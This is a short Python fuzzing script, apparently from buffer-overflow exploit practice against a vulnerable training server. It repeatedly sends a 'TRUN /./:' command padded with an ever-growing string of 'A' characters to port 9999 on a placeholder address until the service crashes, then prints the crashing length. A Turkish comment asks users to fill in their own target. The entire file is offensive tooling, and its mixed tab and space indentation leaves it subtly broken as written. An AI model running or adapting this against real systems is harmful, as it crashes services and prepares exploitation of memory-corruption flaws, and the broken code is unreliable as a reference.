import time
import socket
send_string="TRUN /./:" + "A" *100

while True:
    try:
    	s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	Bytes=send_string.encode(encoding="latin1")
	s.connect(("192.168.x.x",9999))#Bağlantı bilgilerini keendinize göre düzenleyin.
	s.send(Bytes)
	s.close()
	send_string=send_string + "A" *100
	time.sleep(1)
    except KeyboardInterrupt:
        print(str(len(send_string)))
        exit()
    except Exception as i:
        print(str(len(send_string)))
        print(i)
        exit() 
